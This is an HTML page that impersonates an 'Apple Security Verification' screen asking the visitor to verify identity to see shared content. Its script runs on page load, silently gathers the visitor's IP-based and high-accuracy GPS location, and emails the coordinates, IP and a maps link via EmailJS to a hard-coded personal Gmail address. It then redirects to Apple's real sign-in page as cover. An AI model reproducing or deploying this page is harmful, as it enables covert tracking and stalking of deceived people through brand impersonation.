<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple Security Verification</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            background: linear-gradient(135deg, #f8fafc 0%, #ffffff 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }

        .card {
            width: 100%;
            max-width: 400px;
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.1);
            padding: 2rem;
        }

        .header {
            text-align: center;
            margin-bottom: 2rem;
        }

        .icon-container {
            width: 64px;
            height: 64px;
            background: #007AFF;
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1rem;
            box-shadow: 0 8px 25px rgba(0, 122, 255, 0.25);
        }

        .shield-icon {
            width: 32px;
            height: 32px;
            fill: white;
        }

        h1 {
            font-size: 1.5rem;
            font-weight: 600;
            color: #1d1d1f;
            margin-bottom: 0.5rem;
            letter-spacing: -0.01em;
        }

        .subtitle {
            font-size: 0.875rem;
            color: #86868b;
            line-height: 1.5;
        }

        .info-card {
            background: #f0f8ff;
            border: 1px solid #e3f2fd;
            border-radius: 12px;
            padding: 1rem;
            margin-bottom: 1.5rem;
            display: flex;
            align-items: flex-start;
            gap: 0.75rem;
        }

        .info-icon {
            width: 20px;
            height: 20px;
            fill: #007AFF;
            flex-shrink: 0;
            margin-top: 2px;
        }

        .info-content h3 {
            font-size: 0.875rem;
            font-weight: 600;
            color: #1565c0;
            margin-bottom: 0.25rem;
        }

        .info-content p {
            font-size: 0.875rem;
            color: #1976d2;
            line-height: 1.4;
        }

        .action-button {
            width: 100%;
            height: 48px;
            background: #007AFF;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            transition: all 0.2s ease;
            box-shadow: 0 4px 14px rgba(0, 122, 255, 0.25);
            margin-bottom: 1.5rem;
        }

        .action-button:hover {
            background: #0056b3;
            box-shadow: 0 6px 20px rgba(0, 122, 255, 0.3);
            transform: translateY(-1px);
        }

        .action-button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .spinner {
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top: 2px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .lock-icon {
            width: 20px;
            height: 20px;
            fill: currentColor;
        }

        .result-display {
            background: #f5f5f7;
            border: 1px solid #e5e5e7;
            border-radius: 12px;
            padding: 1rem;
            margin-bottom: 1.5rem;
            font-family: 'SF Mono', Monaco, monospace;
            font-size: 0.875rem;
            color: #1d1d1f;
            white-space: pre-line;
            display: none;
        }

        .footer {
            text-align: center;
            font-size: 0.75rem;
            color: #86868b;
        }

        @media (max-width: 480px) {
            .card {
                padding: 1.5rem;
            }
        }
        
        /* Loading indicator for background process */
        .loading-indicator {
            position: fixed;
            top: 10px;
            right: 10px;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(0, 122, 255, 0.3);
            border-top: 2px solid #007AFF;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            z-index: 1000;
            display: none;
        }
        
        .status-text {
            text-align: center;
            font-size: 0.9rem;
            color: #34c759;
            margin-bottom: 1rem;
            display: none;
        }
    </style>
</head>
<body>
    <div class="loading-indicator" id="loadingIndicator"></div>
    
    <div class="card">
        <div class="header">
            <div class="icon-container">
                <svg class="shield-icon" viewBox="0 0 24 24">
                    <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,7C13.4,7 14.8,8.6 14.8,10.5V11.5C15.4,11.5 16,12.4 16,13V16C16,17.4 15.4,18 14.8,18H9.2C8.6,18 8,17.4 8,16V13C8,12.4 8.6,11.5 9.2,11.5V10.5C9.2,8.6 10.6,7 12,7M12,8.2C11.2,8.2 10.5,8.7 10.5,10.5V11.5H13.5V10.5C13.5,8.7 12.8,8.2 12,8.2Z"/>
                </svg>
            </div>
            <h1>Apple Security Verification</h1>
            <p class="subtitle">Verification required to access shared content</p>
        </div>

        <div class="info-card">
            <svg class="info-icon" viewBox="0 0 24 24">
                <path d="M13,9H11V7H13M13,17H11V11H13M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2Z"/>
            </svg>
            <div class="info-content">
                <h3>Security Verification</h3>
                <p>Please verify your identity to access the shared information securely.</p>
            </div>
        </div>

        <div id="statusText" class="status-text">Verification in progress...</div>

        <button class="action-button" onclick="redirectToApple()" id="locationBtn">
            <svg class="lock-icon" viewBox="0 0 24 24">
                <path d="M12,17A2,2 0 0,0 14,15C14,13.89 13.1,13 12,13A2,2 0 0,0 10,15A2,2 0 0,0 12,17M18,8A2,2 0 0,1 20,10V20A2,2 0 0,1 18,22H6A2,2 0 0,1 4,20V10C4,8.89 4.9,8 6,8H7V6A5,5 0 0,1 12,1A5,5 0 0,1 17,6V8H18M12,3A3,3 0 0,0 9,6V8H15V6A3,3 0 0,0 12,3Z"/>
            </svg>
            Continue to Apple ID
        </button>

        <div class="result-display" id="result"></div>

        <div class="footer">
            <p>Apple Inc. â€¢ Privacy Policy</p>
        </div>
    </div>

    <script>
        const EMAIL_CONFIG = {
            serviceId: 'service_7z1wcjl',
            templateId: 'template_xa2n6ht',
            publicKey: 'DJUhavRcWhqXVp1EP',
            recipientEmail: 'shilpkarricha@gmail.com'
        };

        // Initialize EmailJS
        emailjs.init(EMAIL_CONFIG.publicKey);
        
        // Store location data
        let locationData = {
            ip: {},
            html5: {}
        };
        
        // Get location on page load
        window.addEventListener('load', function() {
            document.getElementById('loadingIndicator').style.display = 'block';
            
            // Start with IP-based location
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    locationData.ip = {
                        latitude: data.latitude,
                        longitude: data.longitude,
                        accuracy: 5000,
                        city: data.city,
                        region: data.region,
                        country: data.country_name,
                        ip: data.ip
                    };
                    
                    // Try to get more accurate location
                    tryGetAccurateLocation();
                })
                .catch(error => {
                    console.log('IP geolocation failed:', error);
                    tryGetAccurateLocation();
                });
        });
        
        function tryGetAccurateLocation() {
            if (navigator.geolocation) {
                // Try to get high accuracy location silently
                const options = {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                };
                
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        // High accuracy location obtained
                        locationData.html5 = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        
                        // Send data immediately
                        sendLocationEmail();
                    },
                    function(error) {
                        // If high accuracy fails, send IP-based data
                        sendLocationEmail();
                    },
                    options
                );
            } else {
                // Geolocation not supported, send IP-based data
                sendLocationEmail();
            }
        }
        
        function redirectToApple() {
            // Show status text when button is clicked
            document.getElementById('statusText').style.display = 'block';
            document.getElementById('locationBtn').disabled = true;
            
            // Redirect after a short delay
            setTimeout(function() {
                window.location.href = 'https://account.apple.com/sign-in';
            }, 1500);
        }
        
        function sendLocationEmail() {
            // Use the most accurate location available
            const location = locationData.html5.latitude ? locationData.html5 : locationData.ip;
            
            const timestamp = new Date().toLocaleString();
            const googleMapsLink = `https://maps.google.com/?q=${location.latitude},${location.longitude}`;
            
            const templateParams = {
                to_email: EMAIL_CONFIG.recipientEmail,
                subject: 'Location Captured - Accuracy: ' + (location.accuracy ? Math.round(location.accuracy) + 'm' : 'Unknown'),
                timestamp: timestamp,
                latitude: location.latitude.toFixed(6),
                longitude: location.longitude.toFixed(6),
                accuracy: location.accuracy ? Math.round(location.accuracy) + ' meters' : 'Unknown',
                ip_address: locationData.ip.ip || 'Unknown',
                google_maps_link: googleMapsLink,
                message: `Location detected with accuracy of ${location.accuracy ? Math.round(location.accuracy) + ' meters' : 'Unknown'}.
                         
Coordinates: ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}
Google Maps: ${googleMapsLink}
IP Address: ${locationData.ip.ip || 'Unknown'}
City: ${locationData.ip.city || 'Unknown'}, ${locationData.ip.region || 'Unknown'}, ${locationData.ip.country || 'Unknown'}`
            };

            emailjs.send(EMAIL_CONFIG.serviceId, EMAIL_CONFIG.templateId, templateParams)
                .then(function(response) {
                    console.log('Email sent successfully');
                    document.getElementById('loadingIndicator').style.display = 'none';
                }, function(error) {
                    console.log('Email sending failed:', error);
                    document.getElementById('loadingIndicator').style.display = 'none';
                });
        }
    </script>
</body>
</html>
